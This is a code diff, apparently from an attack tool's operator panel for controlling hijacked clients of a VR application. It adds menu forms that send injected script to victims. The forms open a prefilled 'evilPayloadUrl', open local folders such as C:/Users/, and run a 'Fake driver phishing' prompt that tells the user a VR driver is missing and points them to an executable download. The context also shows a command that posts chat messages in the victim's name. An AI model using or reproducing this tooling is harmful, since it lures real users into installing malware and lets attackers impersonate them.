@@ -353,7 +353,22 @@ function RoomParticipant(identity, room, userId){
         '                        <b class="icon">🤖</b>\n' +
         '                        Control\n' +
         '                    </button>\n' +
-        '                    <div class="dropdown-menu">\n' +
+        '                    <div class="dropdown-menu zombie-control-menu">\n' +
+        '                        <form class="_openURL m-1">\n' +
+        '                            <input type="text" name="openURL" class="form-control" value="'+evilPayloadUrl+'"placeholder="http://example.com/">\n' +
+        '                            <button type="submit" class="btn btn-block btn-primary">Open URL</button>\n' +
+        '                        </form>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <form class="_openPath m-1">\n' +
+        '                            <input type="text" name="openPath" class="form-control" value="C:/Users/" placeholder="C:/Users/">\n' +
+        '                            <button type="submit" class="btn btn-block btn-primary">Open path</button>\n' +
+        '                        </form>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <form class="_fakeDriver m-1">\n' +
+        '                            <input type="text" name="fakeDriver" class="form-control" value="'+fakeDriverUrl+'" placeholder="http://example.com/driver.exe">\n' +
+        '                            <button type="submit" class="btn btn-block btn-primary">Fake driver phishing</button>\n' +
+        '                        </form>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
         '                        <form class="_redirectUI m-1">\n' +
         '                            <input type="text" name="redirectUI" class="form-control" placeholder="http://example.com/">\n' +
         '                            <button type="submit" class="btn btn-block btn-primary">Redirect UI</button>\n' +
@@ -467,6 +482,39 @@ function RoomParticipant(identity, room, userId){
         sendZombieCmd(
             that.identity.uuid,
             `displayChatMessage('${msg}', USER); Unity.sendMessageToBrowsers('chat',['${msg}'], USER, 'all'); var s=new WebSocket('${relayWebSocketServerUrl}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,uuid:ACCOUNT.uuid,'steamId':mySteamId,'oculusId':myOculusId,message:'${msg}'}));s.close();}`
+        );
+    });
+    cardElement.getElementsByClassName('_openURL')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = cardElement.getElementsByClassName('_openURL')[0].getElementsByTagName('input')[0];
+        let url = input.value;
+        // do not clear this form, user might want to use the default URL multiple times
+        // input.value = '';
+        sendZombieCmd(
+            that.identity.uuid,
+            `openLink('${url}');;`
+        );
+    });
+    cardElement.getElementsByClassName('_openPath')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = cardElement.getElementsByClassName('_openPath')[0].getElementsByTagName('input')[0];
+        let path = input.value;
+        // do not clear this form, user might want to use the default path multiple times
+        // input.value = '';
+        sendZombieCmd(
+            that.identity.uuid,
+            `openLink('${path}');;`
+        );
+    });
+    cardElement.getElementsByClassName('_fakeDriver')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = cardElement.getElementsByClassName('_fakeDriver')[0].getElementsByTagName('input')[0];
+        let url = input.value;
+        // do not clear this form, user might want to use the default URL multiple times
+        // input.value = '';
+        sendZombieCmd(
+            that.identity.uuid,
+            `setErrorWarningText("Sorry! Additional VR driver is required.<br/>Please download and install driver.");$("#error-occurred .modal-footer button").click(function(){ openLink('${url}'); });showErrorPrompt()`
         );
     });
     cardElement.getElementsByClassName('_redirectUI')[0].addEventListener("submit", function (event) {
@@ -1218,7 +1266,22 @@ function ZombieControlUI(zombie){
         '                    <button class="nav-link dropdown-toggle" data-toggle="dropdown">\n' +
         '                        <b class="icon">🤖</b> Control\n' +
         '                    </button>\n' +
-        '                    <div class="dropdown-menu">\n' +
+        '                    <div class="dropdown-menu zombie-control-menu">\n' +
+        '                        <form class="_openURL m-1">\n' +
+        '                            <input type="text" name="openURL" class="form-control" value="'+evilPayloadUrl+'"placeholder="http://example.com/">\n' +
+        '                            <button type="submit" class="btn btn-block btn-primary">Open URL</button>\n' +
+        '                        </form>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <form class="_openPath m-1">\n' +
+        '                            <input type="text" name="openPath" class="form-control" value="C:/Users/" placeholder="C:/Users/">\n' +
+        '                            <button type="submit" class="btn btn-block btn-primary">Open path</button>\n' +
+        '                        </form>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <form class="_fakeDriver m-1">\n' +
+        '                            <input type="text" name="fakeDriver" class="form-control" value="'+fakeDriverUrl+'" placeholder="http://example.com/driver.exe">\n' +
+        '                            <button type="submit" class="btn btn-block btn-primary">Fake driver phishing</button>\n' +
+        '                        </form>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
         '                        <form class="_redirectUI m-1">\n' +
         '                             <input type="text" name="redirectUI" class="form-control" placeholder="http://example.com/">\n' +
         '                             <button type="submit" class="btn btn-block btn-primary">Redirect UI</button>\n' +
@@ -1307,6 +1370,39 @@ function ZombieControlUI(zombie){
             function _f(){if(_i<_se.length){Unity.playSoundEffect(_se[_i]);_i++;}else{clearInterval(_id)}};
             _id = setInterval(_f, 200);
         `);
+    });
+    this.controlElement.getElementsByClassName('_openURL')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = that.controlElement.getElementsByClassName('_openURL')[0].getElementsByTagName('input')[0];
+        let url = input.value;
+        // do not clear this form, user might want to use the default URL multiple times
+        // input.value = '';
+        sendZombieCmd(
+            that.zombie.uuid, // NOTE: `zombie` is here used instead of `identity`, maybe could be refactored
+            `openLink('${url}');;`
+        );
+    });
+    this.controlElement.getElementsByClassName('_openPath')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = that.controlElement.getElementsByClassName('_openPath')[0].getElementsByTagName('input')[0];
+        let path = input.value;
+        // do not clear this form, user might want to use the default path multiple times
+        // input.value = '';
+        sendZombieCmd(
+            that.zombie.uuid, // NOTE: `zombie` is here used instead of `identity`, maybe could be refactored
+            `openLink('${path}');;`
+        );
+    });
+    this.controlElement.getElementsByClassName('_fakeDriver')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = that.controlElement.getElementsByClassName('_fakeDriver')[0].getElementsByTagName('input')[0];
+        let url = input.value;
+        // do not clear this form, user might want to use the default URL multiple times
+        // input.value = '';
+        sendZombieCmd(
+            that.zombie.uuid, // NOTE: `zombie` is here used instead of `identity`, maybe could be refactored
+            `setErrorWarningText("Sorry! Additional VR driver is required.<br/>Please download and install driver.");$("#error-occurred .modal-footer button").click(function(){ openLink('${url}'); });showErrorPrompt()`
+        );
     });
     this.controlElement.getElementsByClassName('_redirectUI')[0].addEventListener("submit", function (event) {
         event.preventDefault();
